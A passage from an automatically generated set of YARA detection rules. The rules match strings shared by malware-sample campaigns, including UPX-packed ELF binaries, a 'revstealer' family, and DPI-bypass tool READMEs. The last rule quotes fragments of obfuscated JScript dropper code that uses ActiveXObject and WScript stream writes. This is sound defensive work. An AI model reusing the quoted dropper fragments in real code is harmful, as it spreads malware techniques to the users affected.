        $s9 = "D5B7247C497788CF0031CEB06E3DF77A45FEF59F1E49633DC7159816D64759B5" ascii
        $s10 = "C61B1941CF756EB7551F7C661743802362728B785ADC22E860D269713DFB01A6" ascii
        $s11 = "59058FDDE6089BCA6236FD2AE2D98B3ABB38A7BC80D8DD4C75CEFD7A5D247074" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1141760 and 12 of them
}

rule Sightlines_imphash_39959e42_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-39959e42"
        date = "2026-10-30"
        campaign = "imphash-39959e42"
        family = ""
        hash = "50be586dd407ceb59de8b790e54c0d4716369e175b28e815424eab89e39c7276"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-39959e42.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s1 = "Copyright (c) 2026 RedRiveRR. alimali54/zapret-win-turkey tabanl" wide
        $s2 = "<supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s3 = "<supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s4 = "<supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s5 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"" ascii
        $s6 = "<supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" ascii
        $s7 = ". https://github.com/RedRiveRR/zapret-win-turkey" wide
        $s8 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" ascii
        $s9 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s10 = "ion range exceeded.#Variable subscript badly formatted.*Subscript used on non-accessible variable.&T" wide
        $s11 = "3This keyword cannot be used after a \"Then\" keyword.>\"Select\" statement is missing \"EndSelect\" or \"C" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 3116032 and 12 of them
}

rule Sightlines_tlsh_cd65ea21_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-cd65ea21"
        date = "2026-10-30"
        campaign = "tlsh-cd65ea21"
        family = ""
        hash = "6283633a6139c29b0d0213baefca6000a3f740de83590fdf1ca44bb39e53df58"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-cd65ea21.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "lar: [CONTRIBUTING.md](CONTRIBUTING.md). Her push'ta GitHub Actions ayn" ascii
        $s1 = "- Bilgisayarda **[Npcap](https://npcap.com/#download)**, kurulumda **\"WinPcap API-compatible Mode\"**" ascii
        $s2 = "Bu depo, [alimali54/zapret-win-turkey](https://github.com/alimali54/zapret-win-turkey) projesinin **" ascii
        $s3 = " bu fork'un temeli [zapret-win-turkey](https://github.com/alimali54/zapret-win-turkey)." ascii
        $s4 = "r** (GitHub API; `[Settings] UpdateCheck=0` ile kapat" ascii
        $s5 = "ne bir ZIP kaydedin ve [Issues](https://github.com/RedRiveRR/zapret-win-turkey/issues) sayfas" ascii
        $s6 = " **zapret** motoru ve [zapret-win-bundle](https://github.com/bol-van/zapret-win-bundle)." ascii
        $s7 = "<img src=\"docs/ekran/strateji-koyu.png\" width=\"250\" alt=\"Strateji ekran" ascii
        $s8 = "](https://developer.microsoft.com/microsoft-edge/webview2/) kurabilirsiniz. |" ascii
        $s9 = "1. [Releases](https://github.com/RedRiveRR/zapret-win-turkey/releases) sayfas" ascii
        $s10 = "n ve durumu [Issues](https://github.com/RedRiveRR/zapret-win-turkey/issues) sayfas" ascii
        $s11 = "<img src=\"docs/ekran/dns.png\" width=\"250\" alt=\"DNS ekran" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_be73ae71_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-be73ae71"
        date = "2026-10-30"
        campaign = "imphash-be73ae71"
        family = ""
        hash = "07391591202f8b65645a9ab5b80a43a4477114dd9d72d94e0b88bcd057c1c1c8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-be73ae71.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s1 = "GCC: (Rev5, Built by MSYS2 project) 16.1.0" ascii
        $s2 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s3 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s4 = "      <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s5 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s6 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s7 = "      <!--The ID below indicates application support for Windows 10 -->" ascii
        $s8 = "      <!--The ID below indicates application support for Windows 8 -->" ascii
        $s9 = "      <!--The ID below indicates application support for Windows 7 -->" ascii
        $s10 = "Error cleaning up spin_keys for thread %lu." ascii
        $s11 = "      <!--The ID below indicates application support for Windows Vista -->" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_fc7a3b6e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-fc7a3b6e"
        date = "2026-10-30"
        campaign = "imphash-fc7a3b6e"
        family = ""
        hash = "3949cb6ae3d4b4ac48f56d12ed94505835f59852f3127adc56452de579dfee18"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-fc7a3b6e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s1 = "GCC: (Rev5, Built by MSYS2 project) 16.1.0" ascii
        $s2 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s3 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s4 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s5 = "      <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s6 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s7 = "      <!--The ID below indicates application support for Windows 10 -->" ascii
        $s8 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s9 = "      <!--The ID below indicates application support for Windows 8 -->" ascii
        $s10 = "      <!--The ID below indicates application support for Windows 7 -->" ascii
        $s11 = "      <!--The ID below indicates application support for Windows Vista -->" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_e9c8dfe9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e9c8dfe9"
        date = "2026-10-30"
        campaign = "tlsh-e9c8dfe9"
        family = ""
        hash = "3d76d4c624a030fe28eb57702f03a18e2745acc2969ad27c3d4712be96ebfb26"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e9c8dfe9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.24 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s3 = "5u<[!NL!Frk" ascii
        $s4 = "RS4\\CL&Zrl" ascii
        $s5 = "h`~kRv<}uT" ascii
        $s6 = "+Gwe%7}WI" ascii
        $s7 = "j=bZFV?FN" ascii
        $s8 = "LnDwVtk[" ascii
        $s9 = "MHJ_fh7w" ascii
        $s10 = "MqT}xmi[" ascii
        $s11 = "S\\Ij`Q43" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_30a4dda6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-30a4dda6"
        date = "2026-10-30"
        campaign = "tlsh-30a4dda6"
        family = ""
        hash = "50e191fa03037a3f31c478da563e205d92355c3ff989299dcf40407ac42a5f32"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-30a4dda6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.24 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s3 = "~M[f8,rvO" ascii
        $s4 = "J59p]o|[" ascii
        $s5 = "dV'r^c_S" ascii
        $s6 = "B2v>B)62" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_c642c5f9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c642c5f9"
        date = "2026-10-30"
        campaign = "tlsh-c642c5f9"
        family = ""
        hash = "00acdf1a6e53274103bad33d0e3af7e4222b3c96a464045b3c04e24b6db39d90"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c642c5f9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.24 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "(!PROT_EXEC|PROT_WRITE failed." ascii
        $s3 = "ovD;-Tc$5G@" ascii
        $s4 = "\\N6E<A>Fn" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_53254c00_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-53254c00"
        date = "2026-10-30"
        campaign = "tlsh-53254c00"
        family = ""
        hash = "abf3bd07946b7a2f1ce7a5a770b845a64b02773150ab88a749f82aea06e70b9e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-53254c00.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.24 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s3 = "tbB-|yE:NEjbC" ascii
        $s4 = "T\"qhFO8a}w" ascii
        $s5 = "e?S~o,57y" ascii
        $s6 = "5p'Q>yRP" ascii
        $s7 = "8t/fPkXg" ascii
        $s8 = "UqHY_TZB" ascii
        $s9 = "bA5&C8'9" ascii
        $s10 = "fm#ZhJkH" ascii
        $s11 = "tlP[Ur, " ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_87af4f2d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-87af4f2d"
        date = "2026-10-30"
        campaign = "tlsh-87af4f2d"
        family = ""
        hash = "105e42b8e1cfbe3a7baba5349ceff65bbee9f2707bc92738576f276824623a2b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-87af4f2d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.24 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s3 = "Ts6m'q:#EB" ascii
        $s4 = "*PiX5[#4" ascii
        $s5 = "H-wy&3J)" ascii
        $s6 = "Y&3tE{Ar" ascii
        $s7 = "`hu8RLXK" ascii
        $s8 = "vB]'VGrj" ascii
        $s9 = "O5O~@i_N" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_b862c658_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b862c658"
        date = "2026-10-30"
        campaign = "tlsh-b862c658"
        family = ""
        hash = "01ad58ff981d0f5d113f511a4e74367590086c7ab947335049d3df85c5822449"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b862c658.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.24 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "(!PROT_EXEC|PROT_WRITE failed." ascii
        $s3 = "!LdH #tq" ascii
        $s4 = "Y`R'ncF~" ascii
        $s5 = "j8r<k6%f" ascii
        $s6 = "zbO2_)7\\" ascii
        $s7 = "41UMy*ll" ascii
        $s8 = "n$nua1FE" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 9 of them
}

rule Sightlines_signer_cert_sha1_1bdb48b2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-1bdb48b2"
        date = "2026-10-30"
        campaign = "signer_cert_sha1-1bdb48b2"
        family = ""
        hash = "060bcc88a688e687ff1404b83b5fb5cf17e19ec57f33d5b8a48ab494da83c134"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-1bdb48b2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Ohttp://www.microsoft.com/pkiops/crl/Microsoft%20Code%20Signing%20PCA%202024.crl0m" ascii
        $s1 = "Qhttp://www.microsoft.com/pkiops/certs/Microsoft%20Code%20Signing%20PCA%202024.crt0" ascii
        $s2 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s3 = "10.0.12+95017c711e6afc1085133d440e42b4bd78155701" wide
        $s4 = "Microsoft Code Signing PCA 20240" ascii
        $s5 = ".NETCoreApp,Version=v10.0" ascii
        $s6 = "IsAotCompatible" ascii
        $s7 = "270415185739Z0c1" ascii
        $s8 = "360322221304Z0W1" ascii
        $s9 = "260416185739Z" ascii
        $s10 = "464223+5076060" ascii
        $s11 = "240808205418Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 9229984 and 8 of them
}

rule Sightlines_signer_cert_sha1_3c7274fa_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-3c7274fa"
        date = "2026-10-30"
        campaign = "signer_cert_sha1-3c7274fa"
        family = ""
        hash = "0749d8fc8e944d0576e1bb47120f87add8f875e5cd8968995633063fc79256f6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-3c7274fa.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Ohttp://www.microsoft.com/pkiops/crl/Microsoft%20Code%20Signing%20PCA%202024.crl0m" ascii
        $s1 = "Qhttp://www.microsoft.com/pkiops/certs/Microsoft%20Code%20Signing%20PCA%202024.crt0" ascii
        $s2 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s3 = "10.0.12+95017c711e6afc1085133d440e42b4bd78155701" wide
        $s4 = "Microsoft Code Signing PCA 20240" ascii
        $s5 = ".NETCoreApp,Version=v10.0" ascii
        $s6 = "IsAotCompatible" ascii
        $s7 = "270415185741Z0c1" ascii
        $s8 = "360322221304Z0W1" ascii
        $s9 = "464223+5075960" ascii
        $s10 = "260416185741Z" ascii
        $s11 = "240808205418Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4184656 and 8 of them
}

rule Sightlines_tlsh_b5a59315_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b5a59315"
        date = "2026-10-30"
        campaign = "tlsh-b5a59315"
        family = ""
        hash = "1a6683564e1870afac3cd99268d71f40505c44258236b906ec73eb1b5761b454"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b5a59315.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " 2026 Tensionix, under the [Apache License 2.0](../LICENSE) (see also [NOTICE](../NOTICE)). \"Audion\"" ascii
        $s1 = "Third-party programs (Flowseal, zapret2, ByeDPI Manager) are downloaded from GitHub by your button a" ascii
        $s2 = "[GitHub](https://github.com/Tensionix/dpi-manager)" ascii
        $s3 = "| DNS | The modes GOOGLE, CLOUDFLARE, QUAD9, ADGUARD and OWN (servers and a DoH address in one line)" ascii
        $s4 = "One window for the programs that get round traffic blocking: **Zapret** (Flowseal), **zapret2** (bol" ascii
        $s5 = "| ZAPRET | Install and update Flowseal's package, run a strategy, the service, game and IPSet filter" ascii
        $s6 = "| CONFIGS | The configuration field and a cache of 200 entries (star - pin, cross - delete) |" ascii
        $s7 = "| BYEDPI | Install and update ByeDPI Manager, connect through the system proxy |" ascii
        $s8 = " ZAPRET, ZAPRET 2, BYEDPI, on the right the language, the theme and the font. A switch is a full swi" ascii
        $s9 = "| DIAGNOSTICS | The reasons why the bypass does not work, as a table with fixes |" ascii
        $s10 = "service, parameter tuning, DNS modes, a cache of 200 configurations with pins and deletion." ascii
        $s11 = "| ZAPRET 2 | Install, update and connect zapret2; the preset from its documentation in a field |" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_e3e50016_revstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-e3e50016"
        date = "2026-10-31"
        campaign = "imphash-e3e50016"
        family = "revstealer"
        hash = "751798ddfdcfe032cf8a96e56b528f66d5e6619d509e298f74ca9fc29ccafbca"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-e3e50016.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ShellAboutW" ascii
        $s1 = "[+NCSPyx" ascii
        $s2 = "xIN>]-fQ" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 9473024 and 3 of them
}

rule Sightlines_imphash_c257812e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-c257812e"
        date = "2026-10-30"
        campaign = "imphash-c257812e"
        family = ""
        hash = "a27f73fc68cc57818495ced810ae6bf21fa9fa26ac8f6c9df0dfc8a1458a841f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-c257812e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".?AV?$_Func_impl_no_alloc@V<lambda_25d3896e8ef8b6c96b2447515601dd6c>@@XAEBVTrayIconEvent@nativeapi@@" ascii
        $s1 = ".?AV?$_Func_impl_no_alloc@V<lambda_48413c09f659d914c3d5cf12bd9da65e>@@XAEBVWindowDragEvent@nativeapi" ascii
        $s2 = ".?AV?$_Func_impl_no_alloc@V<lambda_f57a2f4f1480e877f41603cccfb25239>@@V?$optional@_J@std@@PEAUHWND__" ascii
        $s3 = ".?AV?$_Func_impl_no_alloc@V<lambda_4e7f7cd9c7fab1409d5211f2b25264a0>@@XAEBVDragSourceEvent@nativeapi" ascii
        $s4 = ".?AV?$_Func_impl_no_alloc@V<lambda_c8fd7b4dfc00a19c51ff182754a7205c>@@XAEBVDropTargetEvent@nativeapi" ascii
        $s5 = ".?AV?$_Func_impl_no_alloc@V<lambda_4942f08d62feb30f2ac0f0a4d8b15e8f>@@V?$optional@_J@std@@PEAUHWND__" ascii
        $s6 = ".?AV?$_Func_impl_no_alloc@V<lambda_a5b84cc055a4d9604235b78a4293f81e>@@XAEBVDisplayEvent@nativeapi@@@" ascii
        $s7 = ".?AV?$_Func_impl_no_alloc@V<lambda_214d660b748e67ef51530dea3e1b438f>@@XAEBVMenuEvent@nativeapi@@@std" ascii
        $s8 = ".?AV?$_Func_impl_no_alloc@V<lambda_40ae683a230daf887f4516d83637a1ff>@@V?$optional@_J@std@@PEAUHWND__" ascii
        $s9 = ".?AV?$_Func_impl_no_alloc@V<lambda_36811539b42d23eecb5ec5572d26e122>@@V?$optional@_J@std@@PEAUHWND__" ascii
        $s10 = ".?AV?$_Func_impl_no_alloc@V<lambda_06d24ead2778dfd12af737d545eece76>@@V?$optional@_J@std@@PEAUHWND__" ascii
        $s11 = ".?AV?$_Func_impl_no_alloc@V<lambda_49bfa564f4ea9210d72e815f9ccb9b2d>@@XAEBVMenuEvent@nativeapi@@@std" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1350656 and 12 of them
}

rule Sightlines_imphash_5beaf36c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-5beaf36c"
        date = "2026-10-30"
        campaign = "imphash-5beaf36c"
        family = ""
        hash = "0c42127c2e483ff00d5525e71cf53c75d9768421368623c38ea758181672ffba"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-5beaf36c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".?AV?$_Func_impl_no_alloc@V<lambda_7f1a937f2a091b23c858f0d24ff7078e>@@XPEBE_KV?$function@$$A6AXPEBE_" ascii
        $s1 = ".?AV?$_Func_impl_no_alloc@V<lambda_a7e5c5c9b6b04193c20a21573dea4e4a>@@XPEBE_K@std@@" ascii
        $s2 = ".?AV?$_Ref_count_resource@PEAUFlutterDesktopMessenger@@P6AXPEAU1@@Z@std@@" ascii
        $s3 = ".?AV?$_Func_base@XAEBV?$MethodCall@VEncodableValue@flutter@@@flutter@@V?$unique_ptr@V?$MethodResult@" ascii
        $s4 = ".?AV?$_Func_base@V?$optional@_J@std@@PEAUHWND__@@I_K_J@std@@" ascii
        $s5 = "?_New_Locimp@_Locimp@locale@std@@CAPEAV123@AEBV123@@Z" ascii
        $s6 = "?_Locimp_Addfac@_Locimp@locale@std@@CAXPEAV123@PEAVfacet@23@_K@Z" ascii
        $s7 = ".?AV?$_Func_base@XPEBE_KV?$function@$$A6AXPEBE_K@Z@std@@@std@@" ascii
        $s8 = "?_Raise_handler@std@@3P6AXAEBVexception@stdext@@@ZEA" ascii
        $s9 = "?_Init@locale@std@@CAPEAV_Locimp@12@_N@Z" ascii
        $s10 = ".?AV<lambda_7f1a937f2a091b23c858f0d24ff7078e>@@" ascii
        $s11 = "Unknown type in StandardCodecSerializer::ReadValueOfType: " ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_a4deb495_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-a4deb495"
        date = "2026-10-30"
        campaign = "imphash-a4deb495"
        family = ""
        hash = "5acd89f57b2d1ec5a0972323d72956943320b6aba77147561b9f64d666cc4316"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-a4deb495.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ility=\"urn:schemas-microsoft-com:compatibility.v1\" Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"></ms_" ascii
        $s1 = "pplication xmlns=\"urn:schemas-microsoft-com:asm.v3\"><windowsSettings><dpiAwareness xmlns=\"http://sch" ascii
        $s2 = "emas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2</dpiAwareness></windowsSettings></applicat" ascii
        $s3 = ".?AV?$_Ref_count_resource@PEAUFlutterDesktopMessenger@@P6AXPEAU1@@Z@std@@" ascii
        $s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schem" ascii
        $s5 = "Copyright (C) 2026 levvs-one. MIT License." wide
        $s6 = "ibility=\"urn:schemas-microsoft-com:compatibility.v1\"><ms_compatibility:supportedOS xmlns:ms_compatib" ascii
        $s7 = "as-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"requireAdmin" ascii
        $s8 = "v1\" xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><ms_compatibility:application xmlns:ms_compat" ascii
        $s9 = "?_Raise_handler@std@@3P6AXAEBVexception@stdext@@@ZEA" ascii
        $s10 = "istrator\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><a" ascii
        $s11 = ".?AV?$_Ref_count_obj2@VFlutterEngine@flutter@@@std@@" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_7461d5f1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-7461d5f1"
        date = "2026-10-30"
        campaign = "imphash-7461d5f1"
        family = ""
        hash = "04ce42fa815b84480b259d4140c9e2d070e94a5d7480e3f020042892c8ac33a5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-7461d5f1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".?AV?$_Func_impl_no_alloc@V<lambda_06358633a4c44273907fcb2e28171d6d>@@V?$optional@_J@std@@PEAUHWND__" ascii
        $s1 = ".?AV?$_Func_impl_no_alloc@V<lambda_7f1a937f2a091b23c858f0d24ff7078e>@@XPEBE_KV?$function@$$A6AXPEBE_" ascii
        $s2 = ".?AV?$_Func_impl_no_alloc@V<lambda_e037921e1ce5787a4133e127eb1233d0>@@XPEBE_KV?$function@$$A6AXPEBE_" ascii
        $s3 = ".?AV?$_Func_impl_no_alloc@V<lambda_ebf987130683dbcfdf8a9e6741ac0e61>@@V?$unique_ptr@U?$StreamHandler" ascii
        $s4 = ".?AV?$_Func_impl_no_alloc@V<lambda_9f510eb0755469b909feb09f2bfcbb66>@@V?$unique_ptr@U?$StreamHandler" ascii
        $s5 = ".?AV?$_Func_impl_no_alloc@V<lambda_c0c1625216aed95fbf5e7766576c21bb>@@XAEBV?$MethodCall@VEncodableVa" ascii
        $s6 = ".?AV?$_Ref_count_resource@PEAUFlutterDesktopMessenger@@P6AXPEAU1@@Z@std@@" ascii
        $s7 = ".?AV?$_Func_base@XAEBV?$MethodCall@VEncodableValue@flutter@@@flutter@@V?$unique_ptr@V?$MethodResult@" ascii
        $s8 = ".?AV<lambda_06358633a4c44273907fcb2e28171d6d>@@" ascii
        $s9 = ".?AV?$_Func_base@V?$optional@_J@std@@PEAUHWND__@@I_K_J@std@@" ascii
        $s10 = "?_New_Locimp@_Locimp@locale@std@@CAPEAV123@AEBV123@@Z" ascii
        $s11 = "?_Locimp_Addfac@_Locimp@locale@std@@CAXPEAV123@PEAVfacet@23@_K@Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_e2b22837_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e2b22837"
        date = "2026-10-30"
        campaign = "tlsh-e2b22837"
        family = ""
        hash = "3b87e6a5e57e3c548a7ea1ffa1a756a027fee0efc92ce829b07a12b8c1765bef"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e2b22837.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "_MixinApplication197&RenderProxyBox&_RenderTheaterMixin&RenderObjectWithLayoutCallbackMixin@18353248" ascii
        $s1 = "_MixinApplication94&RenderBox&RelayoutWhenSystemFontsChangeMixin@18353248." ascii
        $s2 = "_MixinApplication61&StandardFabLocation&FabCenterOffsetX&FabDockedOffsetY@18353248" ascii
        $s3 = "_MixinApplication63&StandardFabLocation&FabEndOffsetX&FabDockedOffsetY@18353248" ascii
        $s4 = "_MixinApplication169&ValueNotifier&WidgetsBindingObserver@18353248" ascii
        $s5 = "_MixinApplication50&StandardFabLocation&FabEndOffsetX&FabTopOffsetY@18353248" ascii
        $s6 = "_MixinApplication52&StandardFabLocation&FabMiniOffsetAdjustment&FabEndOffsetX&FabTopOffsetY@18353248" ascii
        $s7 = "__Float32ArrayView&_TypedListView&_DoubleListMixin@8027147" ascii
        $s8 = "_MixinApplication46&StandardFabLocation&FabCenterOffsetX&FabTopOffsetY@18353248" ascii
        $s9 = "_MixinApplication59&StandardFabLocation&FabStartOffsetX&FabDockedOffsetY@18353248" ascii
        $s10 = "_MixinApplication64&StandardFabLocation&FabMiniOffsetAdjustment&FabEndOffsetX&FabDockedOffsetY@18353" ascii
        $s11 = "__getCallbackFromHandle$Method$FfiNative@37065589" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 12846864 and 12 of them
}

rule Sightlines_tlsh_aebcb542_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-aebcb542"
        date = "2026-10-30"
        campaign = "tlsh-aebcb542"
        family = ""
        hash = "7301067f8c3c21966e173d67dea0e264a5f70a543ed947f4e1243cfc91dc778c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-aebcb542.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "2620\\u2620')['join'](''),YYfC=AwiC['createElement'](QS9C);" ascii
        $s1 = "  }gf1D['Write'](kg2C['nodeTypedValue']);" ascii
        $s2 = "']('\\u2620\\u2620')['join'](''),AwiC=new ActiveXObject(AuLB);" ascii
        $s3 = "  }EBnC['Write'](YYfC['nodeTypedValue']);" ascii
        $s4 = "TY':'Division\\x20by\\x20zero\\x20exception\\x20flag.'" ascii
        $s5 = "  }EBnC['Position']=0x0,EBnC['Type']=0x1;" ascii
        $s6 = "  }gf1D['Position']=0x0,gf1D['Type']=0x1;" ascii
        $s7 = "620\\u2620\\u2620'['split']('\\u2620')['join']('')),wBSE=WScript['CreateObject']('\\u2620\\u2620\\u2620\\u2" ascii
